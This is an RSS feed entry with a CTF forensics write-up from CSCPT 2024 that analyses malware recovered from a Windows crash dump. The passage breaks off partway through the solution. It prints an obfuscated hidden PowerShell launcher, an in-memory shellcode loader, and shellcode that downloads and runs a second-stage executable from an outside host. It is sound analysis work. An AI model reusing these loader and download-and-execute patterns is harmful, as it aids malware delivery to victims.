<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Shellcode | Duarte Mort√°gua</title><link>http://localhost:1313/tag/shellcode/</link><atom:link href="http://localhost:1313/tag/shellcode/index.xml" rel="self" type="application/rss+xml"/><description>Shellcode</description><generator>Hugo Blox Builder (https://hugoblox.com)</generator><language>en-us</language><lastBuildDate>Sat, 22 Jun 2024 00:00:00 +0000</lastBuildDate><image><url>http://localhost:1313/media/icon_hu68170e94a17a2a43d6dcb45cf0e8e589_3079_512x512_fill_lanczos_center_3.png</url><title>Shellcode</title><link>http://localhost:1313/tag/shellcode/</link></image><item><title>üèÜ Memory and Malware Writeup | CSCPT 2024</title><link>http://localhost:1313/blog/cscpt2024-memory-and-malware/</link><pubDate>Sat, 22 Jun 2024 00:00:00 +0000</pubDate><guid>http://localhost:1313/blog/cscpt2024-memory-and-malware/</guid><description>&lt;p>Welcome üëã&lt;/p>
&lt;details class="print:hidden xl:hidden" open>
&lt;summary>Table of Contents&lt;/summary>
&lt;div class="text-sm">
&lt;nav id="TableOfContents">
&lt;ul>
&lt;li>
&lt;ul>
&lt;li>&lt;a href="#challenge">Challenge&lt;/a>&lt;/li>
&lt;li>&lt;a href="#solution">Solution&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/nav>
&lt;/div>
&lt;/details>
&lt;p>The 10th edition of the &lt;a href="https://www.c-days.cncs.gov.pt/">C-Days&lt;/a> cybersecurity conference took place in Coimbra, Portugal, from June 18th to June 20th, 2024. &lt;a href="https://x.com/cyberchallpt">CyberChallengePT&lt;/a> organized the conference&amp;rsquo;s CTF, which was available during the event at &lt;a href="https://cdays.2024.cybersecuritychallenge.pt/">cdays.2024.cybersecuritychallenge.pt&lt;/a>.&lt;/p>
&lt;p>Below is the writeup for the last forensic challenge, &amp;ldquo;Memory and Malware&amp;rdquo;.&lt;/p>
&lt;h3 id="challenge">Challenge&lt;/h3>
&lt;blockquote>
&lt;p>Um utilizador (CSCPT) descarregou e executou um ficheiro atrav√©s do seu browser Chrome. Este ficheiro cifrou um ficheiro extremamente sens√≠vel localizado em &lt;code>c:\CSCPT\flag.txt&lt;/code>, dando origem a um novo ficheiro &lt;code>c:\CSCPT\flag.enc&lt;/code>. √â necess√°rio analisar o malware, decifrar o ficheiro e obter a flag.&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>NOTA: Embora o malware executado apenas v√° cifrar o ficheiro &lt;code>c:\CSCPT\flag.txt&lt;/code>, o software de antiv√≠rus poder√° identificar os artefactos extra√≠dos de mem√≥ria como maliciosos, pelo que deve ser acedido apenas atrav√©s de uma m√°quina virtual devidamente segregada do sistema operativo base.&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>&lt;a href="https://dfir.pt/cscpt-2024/">https://dfir.pt/cscpt-2024/&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;h3 id="solution">Solution&lt;/h3>
&lt;h4 id="finding-the-malware-in-the-crash-dump-using-volatility">Finding the Malware in the Crash Dump using Volatility&lt;/h4>
&lt;p>The provided file, when extracted, contains a full MS Windows 64bit crash dump (&lt;code>md5sum:98a7c6bfadb52d42e797bc46b20dc675&lt;/code>), which can be asserted by running the following command:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ file WRK01-20240512-195957.dmp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">WRK01-20240512-195957.dmp: MS Windows 64bit crash dump, full dump, &lt;span class="m">1048293&lt;/span> pages
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Volatiliy 3 can be used to extract system information from a crash dump almost like a system image, so we&amp;rsquo;ll use it to search into it and look for the artifacts we need.&lt;/p>
&lt;p>If we&amp;rsquo;re told that we need to analyze the malware, and we know that the malware was downloaded to the machine, we can use Volatility to search within the Downloads folder for suspicious artifacts.&lt;/p>
&lt;p>To do that, we can scan the machine files using the Volatility FileScan plugin:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ python3 vol.py -f &lt;span class="s2">&amp;#34;~/WRK01-20240512-195957.dmp&amp;#34;&lt;/span> windows.filescan.FileScan
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>If you search for &amp;ldquo;Downloads&amp;rdquo; in the output, you&amp;rsquo;ll find one suspicious artifact:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">0xe0845f8cacf0 &lt;span class="se">\U&lt;/span>sers&lt;span class="se">\C&lt;/span>SCPT&lt;span class="se">\D&lt;/span>ownloads&lt;span class="se">\u&lt;/span>rgent &lt;span class="o">(&lt;/span>1&lt;span class="o">)&lt;/span>.zip &lt;span class="m">216&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now, we can dump the file using the previously obtained offset and the DumpFiles plugin:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ python3 vol.py -f &lt;span class="s2">&amp;#34;~/WRK01-20240512-195957.dmp&amp;#34;&lt;/span> windows.dumpfiles.DumpFiles --virtaddr 0xe0845f8cacf0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">...
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Cache FileObject FileName Result
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">DataSectionObject 0xe0845f8cacf0 urgent &lt;span class="o">(&lt;/span>1&lt;span class="o">)&lt;/span>.zip file.0xe0845f8cacf0.0xe084616437d0.DataSectionObject.urgent &lt;span class="o">(&lt;/span>1&lt;span class="o">)&lt;/span>.zip.dat
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>If you try to extract it you can&amp;rsquo;t, because it&amp;rsquo;s not actually a zip file. If you output its contents you&amp;rsquo;ll obtain the following:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ cat file.0xe0845f8cacf0.0xe084616437d0.DataSectionObject.urgent &lt;span class="o">(&lt;/span>1&lt;span class="o">)&lt;/span>.zip.dat
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>ZoneTransfer&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">ZoneId&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">3&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">HostUrl&lt;/span>&lt;span class="o">=&lt;/span>https://dfir.pt/urgent.zip
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Hit the link to download the file (&lt;code>md5sum:8e8f34857a5d2e1b5d48baee55c0262e&lt;/code>).&lt;/p>
&lt;h4 id="deaobfuscating-javascript-and-powershell-using-cyberchef">Deaobfuscating JavaScript and Powershell using Cyberchef&lt;/h4>
&lt;p>Extract it and you&amp;rsquo;ll get the file &lt;code>Urgent.docx.js&lt;/code>. This file contains obfuscated JavaScript content. You can see that in the end there&amp;rsquo;s an &lt;code>ActiveXObject&lt;/code>, which is often used to execute arbitrary code. You can also see that the content being passed as the argument to that new object appears to be a PowerShell script:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">pOWErShElL.ExE&lt;span class="se">\x&lt;/span>20-ExecutionPolicy&lt;span class="se">\x&lt;/span>20bypass&lt;span class="se">\x&lt;/span>20-nOExiT&lt;span class="se">\x&lt;/span>20-noPrOfIlE&lt;span class="se">\x&lt;/span>20-winDowsTyle&lt;span class="se">\x&lt;/span>20hidDEN&lt;span class="se">\x&lt;/span>20/e&lt;span class="se">\x&lt;/span>20JABzAD0...
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>By replacing the &lt;code>\x20&lt;/code> characters with actual spaces, we can see that the code tries to execute a hidden PowerShell console, where the payload starts with &lt;code>JABzAD0...&lt;/code>.&lt;/p>
&lt;p>If you decode that payload from Base64 and remove the null characters (using CyberChef for example), you&amp;rsquo;ll get the following PowerShell script:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$s&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="nb">New-Object&lt;/span> &lt;span class="n">IO&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">MemoryStream&lt;/span>&lt;span class="p">(,[&lt;/span>&lt;span class="no">Convert&lt;/span>&lt;span class="p">]::&lt;/span>&lt;span class="n">FromBase64String&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;H4sI...AAA==&amp;#34;&lt;/span>&lt;span class="p">));&lt;/span>&lt;span class="nb">IEX &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">New-Object&lt;/span> &lt;span class="n">IO&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">StreamReader&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">New-Object&lt;/span> &lt;span class="n">IO&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Compression&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">GzipStream&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$s&lt;/span>&lt;span class="p">,[&lt;/span>&lt;span class="no">IO.Compression.CompressionMode&lt;/span>&lt;span class="p">]::&lt;/span>&lt;span class="n">Decompress&lt;/span>&lt;span class="p">))).&lt;/span>&lt;span class="py">ReadToEnd&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>If you look at the script, you&amp;rsquo;ll see that it decodes another Base64 encoded string and then decompresses it&amp;rsquo;s result using GZip. If you provide the string &lt;code>H4sI...AAA==&lt;/code> as input to CyberChef and apply the recipe &amp;ldquo;From Base64&amp;rdquo; &amp;gt; &amp;ldquo;Gunzip&amp;rdquo;, you&amp;rsquo;ll get another PowerShell script:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$txtRecord&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">Resolve-DnsName&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="s2">&amp;#34;cscpt.dfir.pt&amp;#34;&lt;/span> &lt;span class="n">-Type&lt;/span> &lt;span class="n">TXT&lt;/span> &lt;span class="n">-Server&lt;/span> &lt;span class="s2">&amp;#34;8.8.8.8&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Select-Object&lt;/span> &lt;span class="n">-ExpandProperty&lt;/span> &lt;span class="n">Strings&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="nb">New-Item&lt;/span> &lt;span class="n">-Path&lt;/span> &lt;span class="s2">&amp;#34;HKCU:\SOFTWARE\Setec&amp;#34;&lt;/span> &lt;span class="n">-Force&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Out-Null&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">Set-ItemProperty&lt;/span> &lt;span class="n">-Path&lt;/span> &lt;span class="s2">&amp;#34;HKCU:\SOFTWARE\Setec&amp;#34;&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="s2">&amp;#34;License&amp;#34;&lt;/span> &lt;span class="n">-Value&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$txtRecord&lt;/span> &lt;span class="n">-join&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">...&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="no">Byte[]&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nv">$hgPLffkJY&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="n">0x48&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x83&lt;/span>&lt;span class="p">,...,&lt;/span>&lt;span class="n">0xc4&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x20&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$sljwiiCURtDMX&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nv">$IwaCWYUoftIYXr&lt;/span>&lt;span class="p">::&lt;/span>&lt;span class="n">VirtualAlloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mf">0&lt;/span>&lt;span class="p">,[&lt;/span>&lt;span class="no">Math&lt;/span>&lt;span class="p">]::&lt;/span>&lt;span class="n">Max&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$hgPLffkJY&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Length&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x1000&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="n">0x3000&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">0x40&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="no">System.Runtime.InteropServices.Marshal&lt;/span>&lt;span class="p">]::&lt;/span>&lt;span class="n">Copy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$hgPLffkJY&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mf">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nv">$sljwiiCURtDMX&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nv">$hgPLffkJY&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Length&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$IwaCWYUoftIYXr&lt;/span>&lt;span class="p">::&lt;/span>&lt;span class="n">CreateThread&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mf">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mf">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nv">$sljwiiCURtDMX&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mf">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mf">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mf">0&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>This new script starts by trying to resolve the DNS name &amp;ldquo;cscpt.dfir.pt&amp;rdquo; and obtain it&amp;rsquo;s TXT record value. If it does, it creates the Registry key &amp;ldquo;License&amp;rdquo; with the value of that TXT record in the path &amp;ldquo;HKCU:\SOFTWARE\Setec&amp;rdquo;.&lt;/p>
&lt;p>If you try to retrieve the TXT record manually, you&amp;rsquo;ll see that it is no longer available online.&lt;/p>
&lt;p>Then, it eventually calls the &lt;code>kernel32.dll&lt;/code> functions &lt;code>VirtualAlloc&lt;/code> and &lt;code>CreateThread&lt;/code> in order to run a piece of shellcode, through the contents of the byte array variable &lt;code>$hgPLffkJY&lt;/code>.&lt;/p>
&lt;p>In order to dump that shellcode, we can do it dynamically by debugging the script, or statically using Cyberchef. If you provide the bytes &lt;code>0x48,0x83,...,0xc4,0x20&lt;/code> as input to CyberChef, delete the &amp;ldquo;0x&amp;quot;s and replace &amp;ldquo;,&amp;rdquo; by &amp;quot; &amp;ldquo;, and then apply the recipe &amp;ldquo;From Hex&amp;rdquo;, you&amp;rsquo;ll get the shellcode:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">H¬É√¨&lt;span class="o">(&lt;/span>H¬É√§√∞H1√âeH¬ãA&lt;span class="sb">`&lt;/span>H¬ã@H¬ãp H¬≠H¬ñH¬≠H¬ãX M1√ÄD¬ãC&amp;lt;L¬â√ÇH√öH1√â¬±¬àH√ëD¬ãI√òH1√∂A¬ãp H√ûH1√âI¬πGetProcAH√ø√ÅH1√Ä¬ã¬éH√òL9u√ØH1√∂A¬ãp&lt;span class="nv">$H&lt;/span>√ûf¬ã NH1√∂A¬ãpH√ûH1√í¬ã¬éH√öH¬â√ó¬πaryAQH¬πLoadLibrQH¬â√¢H¬â√ôH¬É√¨0√ø√óH¬É√Ñ0H¬É√ÑH¬â√ÜH1√Äf¬∏llPH¬∏urlmon.dPH¬â√°H¬É√¨0√ø√ñH¬É√Ñ@PH1√Äf¬∏eAPH¬∏oadToFilPH¬∏URLDownlPH¬â√¢H¬ãL$H¬É√¨0√ø√óH¬É√ÑHPH1√ÄH¬∏WinExecÔøΩPH¬â√¢H¬â√ôH¬É√¨&lt;span class="o">(&lt;/span>√ø√óH¬É√Ñ0PH1√Ä¬∏essÔøΩPH¬∏ExitProcPH¬â√¢H¬â√ôH¬É√¨&lt;span class="o">(&lt;/span>√ø√óH¬É√Ñ8PH1√Ä¬∞nPH¬∏cscpt.biPH¬∏dfir.pt/PH¬∏https://PTH1√ÄH¬∏2.exeÔøΩÔøΩÔøΩPH¬∏&lt;span class="se">\r&lt;/span>undll3PH¬∏SOSharedPH¬∏amData&lt;span class="se">\U&lt;/span>PH¬∏C:&lt;span class="se">\P&lt;/span>rogrPTH1√ÄPM1√âL¬ãD$H¬ãT&lt;span class="nv">$8&lt;/span>H1√âH¬É√¨ √ø¬î$¬êÔøΩÔøΩÔøΩH¬É√Ñ H¬É√Ñ&lt;span class="sb">`&lt;/span>H1√ÄH¬∏2.exeÔøΩÔøΩÔøΩPH¬∏&lt;span class="se">\r&lt;/span>undll3PH¬∏SOSharedPH¬∏amData&lt;span class="se">\U&lt;/span>PH¬∏C:&lt;span class="se">\P&lt;/span>rogrPTH1√íH¬ã &lt;span class="nv">$H&lt;/span>¬É√¨ √øT&lt;span class="nv">$XH&lt;/span>¬É√Ñ H¬É√Ñ0H1√âH¬É√¨ √øT$ H¬É√Ñ
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can spot strings such as &amp;ldquo;URLDownloadToFile&amp;rdquo;, &amp;ldquo;cscpt&amp;rdquo;, &amp;ldquo;dfir.pt&amp;rdquo;, &amp;ldquo;2.exe&amp;rdquo;, &amp;ldquo;rundll&amp;rdquo;, &amp;ldquo;C:\ProgramData&amp;rdquo;, etc. These strings suggest that this shellcode downloads a file from &amp;ldquo;dfir.pt&amp;rdquo;, but we can&amp;rsquo;t make much sense of out it, at least statically.&lt;/p>
&lt;h4 id="debugginng-shellcode-using-runsc-and-x64dbg">Debugginng Shellcode using runsc and x64dbg&lt;/h4>
&lt;p>I opted to run the shellcode and debug it, in order to find the call to the target URL. To do that, I used the &lt;code>runsc&lt;/code> utility by &lt;a href="https://github.com/edygert/runsc/releases/tag/V1.0.0">edygert&lt;/a> which loads 32bit or 64bit shellcode in a way that makes it easy to load in a debugger.&lt;/p>
&lt;p>After saving the previous mentioned shellcode to the file &lt;code>shellcode.bin&lt;/code>, we can run the following command in a Windows machine:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-cmd" data-lang="cmd">&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;gt;&lt;/span> runsc64.exe -f shellcode.bin -n
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>As it doesn&amp;rsquo;t blow up, it means it ran. If you tried this with &lt;code>runsc32.exe&lt;/code> (32bit shellcode), you would get the following error: &amp;ldquo;error accessing 0x00000060 not mapped&amp;rdquo;, which suggests that it&amp;rsquo;s probably 64bit shellcode.&lt;/p>
&lt;p>Now that we know it runs, we&amp;rsquo;ll run it as a suspended thread, to give us time to attach to this process with a debugger.&lt;/p>
&lt;p>Open x64dbg, go to &amp;ldquo;File&amp;rdquo; &amp;gt; &amp;ldquo;Attach&amp;rdquo; and attach to the runsc64 process. Then, set a breakpoint on the shellcode address shown by runsc64, by typing &lt;code>SetBPX 0x0000014DE2FF0000&lt;/code> in the Command input box. Then, switch back to the runsc64 window and press any key to resume the shellcode thread. You&amp;rsquo;ll notice that x64dbg will pause on the breakpoint set, placing us in the beginning of the shellcode.&lt;/p>
&lt;p>Since we suspect that a file will be downloaded, we can set breakpoints on the &lt;code>CALL&lt;/code> instructions that appear in the assembly instuctions, and keep an eye on their registers values.&lt;/p>
&lt;p>When you reach the 6th CALL instruction (000001D0981E01C2), you can see that the function called is &lt;code>urlmon.URLDownloadToFileA&lt;/code>, which the arguments are &lt;code>rdx=&amp;quot;https://dfir.pt/cscpt.bin&amp;quot;&lt;/code> and &lt;code>r8=&amp;quot;C:\\ProgramData\\USOShared\\rundll32.exe&amp;quot;&lt;/code>.&lt;/p>
&lt;p>This means that our next stage is located at &lt;code>https://dfir.pt/cscpt.bin&lt;/code>, which you can download manually.&lt;/p>
&lt;h4 id="obtaining-the-payload-source-code">Obtaining the payload source code&lt;/h4>
&lt;p>The provided file seems to be a PE executable:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ file cscpt.bin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cscpt.bin: PE32+ executable &lt;span class="o">(&lt;/span>console&lt;span class="o">)&lt;/span> x86-64, &lt;span class="k">for&lt;/span> MS Windows
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>If we rename it in Windows to &lt;code>cscpt.exe&lt;/code>, we can see it assumes an icon realted to Python, which may suggest that it was done using Python.&lt;/p>
&lt;p>Let&amp;rsquo;s run &lt;code>pestr&lt;/code> in a Linux machine and analyze its strings (greater than 20 characters to avoid noise):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ pestr -n &lt;span class="m">20&lt;/span> cscpt.exe &amp;gt; cscpt.exe.pestr
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The strings include references to Python errors (&lt;code>PyErr_*&lt;/code>) and other Python modules, as well as references to &lt;code>cryptography.hazmat.*&lt;/code> modules, which is a Python package to perform cryptographic operations. This means that this executable was most likely obtained from Python source code.&lt;/p>
&lt;p>In efforts to obtain the Python source code, I searched &amp;ldquo;exe to python&amp;rdquo; online and came across a StackOverflow thread that suggested that, if the executable was obtained using PyInstaller, obtaining the source code would be as simple as running the &lt;a href="https://sourceforge.net/projects/pyinstallerextractor/">PyInstaller Extractor&lt;/a>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ python3 pyinstxtractor.py cscpt.exe
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The result of this command is the folder &lt;code>cscpt.exe_extracted&lt;/code> containing a bunch of &lt;code>pyc&lt;/code> files. According to Google, &lt;code>pyc&lt;/code> are compiled bytecode files that can be executed directly by the interpreter, but it&amp;rsquo;s still unreadable code. Doing some more search, I discovered that it may be trivial to obtain the Python source code from the &lt;code>pyc&lt;/code> files using &lt;a href="https://github.com/rocky/python-uncompyle6/">uncompyle6&lt;/a>, a Python bytecode decompiler.&lt;/p>
&lt;p>It can be installed via pip with:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ python3 -m pip install uncompyle6
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then tried to decompile what appeared to be the main file &lt;code>cscpt.pyc&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ uncompyle6 cscpt.pyc
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&amp;hellip; and it worked! The file &lt;code>cscpt.py&lt;/code> appeared in my working directory, containing the full and clean Python source code for the flag cipher operation.&lt;/p>
&lt;h4 id="understanding-and-reversing-the-cipher">Understanding and reversing the cipher&lt;/h4>
&lt;p>Analyzing the code structure, it turns out to be simple:&lt;/p>
&lt;ul>
&lt;li>A key to cipher the file is generated, which takes as input (or &amp;ldquo;seed&amp;rdquo;) the Registry key that we saw previously (&amp;ldquo;License&amp;rdquo; value from &amp;ldquo;HKCU:\SOFTWARE\Setec&amp;rdquo;) and them mixes it up using XORs and other mathematical operations.&lt;/li>
&lt;li>The contents of the flag file &lt;code>C:\CSCPT\flag.txt&lt;/code> are ciphered with AES in CBC mode, using the mentioned key and a random 16 bytes IV.&lt;/li>
&lt;li>The IV is appended to the beggining of the ciphertext, where the result is encoded using Base64 and then written to the file &lt;code>C:\CSCPT\flag.enc&lt;/code>.&lt;/li>
&lt;/ul>
&lt;p>This means that, before implementing something, we need to retrieve the 2 artifacts that are needed:&lt;/p>
&lt;ul>
&lt;li>The &amp;ldquo;License&amp;rdquo; Registry key.&lt;/li>
&lt;li>The encrypted flag from &lt;code>C:\CSCPT\flag.enc&lt;/code>.&lt;/li>
&lt;/ul>
&lt;p>We can retrieve the flag using the same process that we used to dump &lt;code>urgent.zip&lt;/code>:&lt;/p>
&lt;p>Search &lt;code>flag.enc&lt;/code> in the Volatiliy Filescan plugin output:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">0xe0845f8b7600 &lt;span class="se">\C&lt;/span>SCPT&lt;span class="se">\f&lt;/span>lag.enc &lt;span class="m">216&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now, we can dump the file using the previously obtained offset:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ python3 vol.py -f &lt;span class="s2">&amp;#34;~/WRK01-20240512-195957.dmp&amp;#34;&lt;/span> windows.dumpfiles.DumpFiles --virtaddr 0xe0845f8b7600
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">...
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Cache FileObject FileName Result
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">DataSectionObject 0xe0845f8b7600 flag.enc Error dumping file
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Although it says &lt;code>Error dumping file&lt;/code>, the file is successfully dumped.&lt;/p>
&lt;p>In order to retrieve the Registry key, we need to use the Volatility HiveList plugin to list the available registry hives in the dump, and then dump the key from the appropriate hive:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ python3 vol.py -f &lt;span class="s2">&amp;#34;~/WRK01-20240512-195957.dmp&amp;#34;&lt;/span> windows.registry.hivelist.HiveList
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We are looking for the &lt;code>HKCU&lt;/code> registry hive (short for &lt;code>HKEY_CURRENT_USER&lt;/code>), which stores configuration information for Windows and software relevant for the logged-in user. The &amp;ldquo;Software&amp;rdquo; sub-key of the &lt;code>HKCU&lt;/code> hive resides in the &lt;code>NTUSER.DAT&lt;/code> file (checked &lt;a href="https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives">here&lt;/a>), in the current user home directory.&lt;/p>
&lt;p>This file can be found in the HivesList output:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">...
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0xbb0e4e9bf000 &lt;span class="se">\?&lt;/span>?&lt;span class="se">\C&lt;/span>:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\C&lt;/span>SCPT&lt;span class="se">\n&lt;/span>tuser.dat Disabled
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">...
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Having the hive file offset and the key name, we can use the Volatility PrintKey plugin to extract it:&lt;/p>
